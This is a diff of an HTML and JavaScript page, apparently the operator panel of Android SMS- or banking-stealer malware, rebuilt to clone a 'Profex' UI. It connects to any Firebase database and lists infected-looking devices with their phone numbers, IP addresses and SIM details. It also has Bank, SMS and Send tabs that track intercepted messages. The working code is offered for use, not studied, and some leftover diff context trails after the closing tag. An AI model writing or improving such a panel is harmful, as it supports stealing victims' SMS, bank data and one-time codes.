@@ -5,36 +5,263 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Frankey Panel</title>
     <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        /* Custom scrollbar for dark theme */
+        ::-webkit-scrollbar { width: 4px; }
+        ::-webkit-scrollbar-track { background: #080808; }
+        ::-webkit-scrollbar-thumb { background: #333; border-radius: 4px; }
+    </style>
 </head>
-<body class="bg-gray-900 text-white font-sans antialiased flex flex-col items-center justify-center min-h-screen p-4">
+<body class="bg-[#000000] text-white font-sans antialiased flex flex-col items-center justify-center min-h-screen">
 
     <!-- Main Container -->
-    <div class="w-full max-w-md bg-gray-800 rounded-xl shadow-2xl overflow-hidden border border-gray-700 relative min-h-[500px]">
+    <div class="w-full h-screen max-w-md bg-[#080808] relative overflow-hidden flex flex-col shadow-2xl sm:h-[800px] sm:border sm:border-[#1a1a1a] sm:rounded-xl">
         
-        <!-- Header for Connect & List Pages -->
-        <div id="main-header" class="bg-gray-950 p-5 text-center border-b border-gray-700 shadow-sm relative">
+        <!-- ========================================== -->
+        <!-- SCREEN 1 & 2: CONNECT & LIST (Basic View)  -->
+        <!-- ========================================== -->
+        <div id="main-header" class="bg-[#0a0a0a] p-5 text-center border-b border-[#1a1a1a] shadow-sm">
             <h1 class="text-2xl font-bold tracking-widest text-blue-500 uppercase drop-shadow-md">Profex Console</h1>
-            <p id="header-status" class="text-gray-400 text-xs mt-1">Status: Disconnected</p>
+            <p id="header-status" class="text-gray-500 text-xs mt-1">Status: Disconnected</p>
         </div>
 
-        <div class="p-5">
-            <!-- SCREEN 1: CONNECTION PAGE -->
-            <div id="screen-connect" class="space-y-4">
-                <div class="bg-gray-900 p-4 rounded-lg border border-gray-700">
-                    <h3 class="text-sm font-semibold text-gray-200 mb-2">Connect Firebase Database</h3>
-                    <textarea id="firebase-config-input" rows="4" class="w-full bg-gray-950 text-xs text-green-400 p-3 rounded border border-gray-600 focus:outline-none focus:border-blue-500 placeholder-gray-600 font-mono" placeholder="Paste Direct Link (https://...) OR JSON Config here..."></textarea>
-                    <button id="connect-db-btn" class="w-full mt-3 bg-blue-600 hover:bg-blue-500 text-white font-semibold py-2 px-4 rounded transition duration-200 shadow">
-                        Connect Database
+        <div id="screen-connect" class="p-5 space-y-4 flex-1">
+            <div class="bg-[#0a0a0a] p-4 rounded-lg border border-[#1a1a1a]">
+                <h3 class="text-sm font-semibold text-gray-300 mb-2">Connect Firebase Database</h3>
+                <textarea id="firebase-config-input" rows="4" class="w-full bg-[#111] text-xs text-green-500 p-3 rounded border border-[#222] focus:outline-none focus:border-blue-500 placeholder-gray-700 font-mono" placeholder="Paste Direct Link OR JSON Config here..."></textarea>
+                <button id="connect-db-btn" class="w-full mt-3 bg-blue-600 hover:bg-blue-500 text-white font-semibold py-2 px-4 rounded transition shadow">
+                    Connect
+                </button>
+            </div>
+        </div>
+
+        <div id="screen-list" class="hidden p-5 flex-1 overflow-y-auto">
+            <div class="flex justify-between items-center border-b border-[#1a1a1a] pb-2 mb-3">
+                <h2 class="text-lg font-semibold text-gray-300">Active Devices</h2>
+                <span id="account-count" class="bg-green-700 text-white text-xs px-2 py-0.5 rounded-full">0</span>
+            </div>
+            <div id="device-list-container" class="flex flex-col gap-2"></div>
+        </div>
+
+        <!-- ========================================== -->
+        <!-- SCREEN 3: EXACT PROFEX UI CLONE (Image Match) -->
+        <!-- ========================================== -->
+        <div id="screen-details" class="hidden absolute top-0 left-0 w-full h-full bg-[#080808] z-50 flex flex-col overflow-hidden text-white">
+            
+            <!-- Header Section -->
+            <div class="flex items-center justify-between p-4 border-b border-[#1a1a1a] bg-[#0a0a0a]">
+                <div class="flex items-center gap-3">
+                    <!-- Green Wifi Icon inside dark circle -->
+                    <div class="w-10 h-10 rounded-full bg-[#111] border border-[#222] flex items-center justify-center">
+                        <svg class="w-5 h-5 text-[#00c853]" fill="none" stroke="currentColor" viewBox="0 0 24 24" stroke-width="1.5"><path stroke-linecap="round" stroke-linejoin="round" d="M8.111 16.404a5.5 5.5 0 017.778 0M12 20h.01m-7.08-7.071c3.904-3.905 10.236-3.905 14.141 0M1.394 9.393c5.857-5.857 15.355-5.857 21.213 0"></path></svg>
+                    </div>
+                    <div class="leading-tight">
+                        <h2 id="detail-id" class="text-[#e0e0e0] font-semibold text-[15px] tracking-wide">fc551c6200c1d9f2</h2>
+                        <p id="detail-sub" class="text-[#555] text-[11px] mt-0.5 tracking-wide">fc551c6200c1d9f2</p>
+                    </div>
+                </div>
+                <div class="flex items-center gap-2.5">
+                    <!-- Red Delete Button -->
+                    <button class="w-8 h-8 rounded-full bg-[#2a0d0d] text-[#ff3b3b] flex items-center justify-center hover:bg-[#3a1515] transition">
+                        <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5" d="M19 7l-.867 12.142A2 2 0 0116.138 21H7.862a2 2 0 01-1.995-1.858L5 7m5 4v6m4-6v6m1-10V4a1 1 0 00-1-1h-4a1 1 0 00-1 1v3M4 7h16"/></svg>
+                    </button>
+                    <!-- Close (X) Button -->
+                    <button id="btn-close-details" class="w-8 h-8 rounded-full bg-[#111] border border-[#222] text-[#777] flex items-center justify-center hover:bg-[#222] transition">
+                        <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"/></svg>
                     </button>
                 </div>
             </div>
 
-            <!-- SCREEN 2: DEVICE LIST PAGE -->
-            <div id="screen-list" class="hidden space-y-3">
-                <div class="flex justify-between items-center border-b border-gray-700 pb-2 mb-2">
-                    <h2 class="text-lg font-semibold text-gray-200">Active Devices</h2>
-                    <span id="account-count" class="bg-green-600 text-white text-xs px-2 py-0.5 rounded-full shadow">0</span>
+            <!-- Status Bar Section -->
+            <div class="flex items-center gap-4 px-5 py-3 text-[12px] bg-[#0a0a0a]">
+                <div class="flex items-center gap-1.5">
+                    <div class="w-2 h-2 rounded-full bg-[#00c853]"></div>
+                    <span class="text-[#00c853] font-medium tracking-wide">Online</span>
                 </div>
+                <div class="text-[#666] tracking-wide">
+                    Bat <span class="text-[#ffb300] font-medium ml-1" id="val-battery">36%</span>
+                </div>
+            </div>
+
+            <!-- Tabs Section -->
+            <div class="flex px-5 border-b border-[#1a1a1a] text-[12px] font-medium bg-[#0a0a0a] tracking-wide">
+                <div class="text-[#ff3b3b] border-b-[3px] border-[#ff3b3b] pb-2 pr-5 cursor-pointer">Info</div>
+                <div class="text-[#555] pb-2 px-5 cursor-pointer">Bank (0)</div>
+                <div class="text-[#555] pb-2 px-5 cursor-pointer">SMS (<span id="sms-count">150</span>)</div>
+                <div class="text-[#555] pb-2 pl-5 cursor-pointer">Send</div>
+            </div>
+
+            <!-- List Content Section -->
+            <div class="flex-1 overflow-y-auto p-5 bg-[#080808]">
+                
+                <!-- DEVICE HEADER -->
+                <div class="text-[#444] text-[10px] font-bold tracking-[0.15em] mb-4">DEVICE</div>
+                
+                <div class="space-y-4 text-[13px] mb-8" id="info-device-list">
+                    <!-- Injected via JS -->
+                </div>
+
+                <!-- FROM SMS HEADER -->
+                <div class="text-[#444] text-[10px] font-bold tracking-[0.15em] mb-4">FROM SMS</div>
+                
+                <div class="space-y-4 text-[13px] pb-10" id="info-sms-list">
+                    <!-- Injected via JS -->
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Firebase SDK & Logic -->
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.1/firebase-app.js";
+        import { getDatabase, ref, onValue, off } from "https://www.gstatic.com/firebasejs/10.8.1/firebase-database.js";
+
+        // DOM Elements
+        const screenConnect = document.getElementById('screen-connect');
+        const screenList = document.getElementById('screen-list');
+        const screenDetails = document.getElementById('screen-details');
+        const mainHeader = document.getElementById('main-header');
+        const headerStatus = document.getElementById('header-status');
+        
+        let globalDb = null;
+        let activeDeviceListener = null;
+
+        // Function to toggle screens
+        function showScreen(screenName) {
+            screenConnect.classList.add('hidden');
+            screenList.classList.add('hidden');
+            screenDetails.classList.add('hidden');
+            mainHeader.classList.remove('hidden');
+
+            if(screenName === 'connect') screenConnect.classList.remove('hidden');
+            if(screenName === 'list') {
+                screenList.classList.remove('hidden');
+                headerStatus.innerText = "Status: Connected";
+                headerStatus.className = "text-[#00c853] text-xs mt-1 font-bold";
+            }
+            if(screenName === 'details') {
+                screenDetails.classList.remove('hidden');
+                mainHeader.classList.add('hidden'); // Hide header in full view
+            }
+        }
+
+        // Connect Button
+        document.getElementById('connect-db-btn').addEventListener('click', () => {
+            const configInput = document.getElementById('firebase-config-input').value.trim();
+            if(!configInput) return;
+            
+            try {
+                let dynamicConfig = configInput.startsWith("http") 
+                    ? { databaseURL: configInput } 
+                    : JSON.parse(configInput);
+                
+                const dynamicApp = initializeApp(dynamicConfig, "App_" + Date.now());
+                globalDb = getDatabase(dynamicApp);
+
+                startListeningToDevices();
+                showScreen('list');
+            } catch (error) {
+                alert("Connection failed. Check your Link or JSON.");
+            }
+        });
+
+        // Load Device List
+        function startListeningToDevices() {
+            const listContainer = document.getElementById('device-list-container');
+            const dataRef = ref(globalDb, 'devices'); 
+
+            onValue(dataRef, (snapshot) => {
+                const data = snapshot.val();
+                listContainer.innerHTML = ''; 
+                
+                if (data) {
+                    const keys = Object.keys(data);
+                    document.getElementById('account-count').innerText = keys.length;
+                    
+                    keys.forEach(deviceId => {
+                        const btn = document.createElement('button');
+                        btn.className = "w-full text-left bg-[#111] hover:bg-[#1a1a1a] p-3 rounded border border-[#222] transition flex justify-between items-center";
+                        btn.innerHTML = `
+                            <span class="font-mono text-sm text-[#e0e0e0]">${deviceId}</span>
+                            <span class="text-xs text-[#00c853] font-medium">Open</span>
+                        `;
+                        btn.onclick = () => openDeviceDetails(deviceId);
+                        listContainer.appendChild(btn);
+                    });
+                }
+            });
+        }
+
+        // Close Detail Page
+        document.getElementById('btn-close-details').addEventListener('click', () => {
+            if(activeDeviceListener && globalDb) {
+                const targetId = document.getElementById('detail-id').innerText;
+                off(ref(globalDb, `devices/${targetId}`));
+            }
+            showScreen('list');
+        });
+
+        // Layout Helper (Exact colors from screenshot)
+        function createRow(label, value, valueColorClass = "text-[#d1d5db]") {
+            return `
+                <div class="flex justify-between items-center tracking-wide">
+                    <span class="text-[#6b7280]">${label}</span>
+                    <span class="${valueColorClass} text-right font-medium">${value || '—'}</span>
+                </div>
+            `;
+        }
+
+        // Open Screen 3 & Populate Data
+        function openDeviceDetails(deviceId) {
+            showScreen('details');
+            
+            document.getElementById('detail-id').innerText = deviceId;
+            document.getElementById('detail-sub').innerText = deviceId;
+            
+            const deviceListEl = document.getElementById('info-device-list');
+            const smsListEl = document.getElementById('info-sms-list');
+            
+            deviceListEl.innerHTML = '<div class="text-[#555] animate-pulse">Loading...</div>';
+            smsListEl.innerHTML = '';
+            document.getElementById('sms-count').innerText = "0";
+
+            const deviceRef = ref(globalDb, `devices/${deviceId}`);
+
+            activeDeviceListener = onValue(deviceRef, (snapshot) => {
+                const data = snapshot.val();
+                
+                if(data) {
+                    document.getElementById('val-battery').innerText = data.battery ? `${data.battery}%` : '36%';
+
+                    // 1. DEVICE SECTION (White & Grey values)
+                    deviceListEl.innerHTML = 
+                        createRow("Phone Number", data.phoneNumber || data.number, "text-[#e0e0e0]") +
+                        createRow("Network", data.network || "Jio", "text-[#d1d5db]") +
+                        createRow("Android", data.androidVersion || data.android) +
+                        createRow("IP Address", data.ip) +
+                        createRow("Storage", data.storage) +
+                        createRow("CPU Arch", data.cpu) +
+                        createRow("SDK Version", data.sdk) +
+                        createRow("SIM Cards", data.simCount ? `${data.simCount} SIM(s)` : "0 SIM(s)", "text-[#e0e0e0]");
+
+                    // 2. FROM SMS SECTION (Blue & Purple values based on screenshot)
+                    smsListEl.innerHTML = 
+                        createRow("Phone #1", data.phone1 || data.phoneNumber, "text-[#3b82f6]") +
+                        createRow("Network #1", data.network1 || data.network || "Jio", "text-[#c026d3]") +
+                        createRow("Network #2", data.network2 || "Vodafone", "text-[#c026d3]");
+                        
+                    // SMS count tracker
+                    if(data.smsCount) {
+                         document.getElementById('sms-count').innerText = data.smsCount;
+                    } else if(data.smsData && Array.isArray(data.smsData)) {
+                         document.getElementById('sms-count').innerText = data.smsData.length;
+                    }
+                }
+            });
+        }
+    </script>
+</body>
+</html>                </div>
                 <div id="device-list-container" class="flex flex-col gap-2 max-h-[350px] overflow-y-auto pr-1">
                     <div class="text-center text-gray-500 text-sm py-4">Waiting for devices...</div>
                 </div>
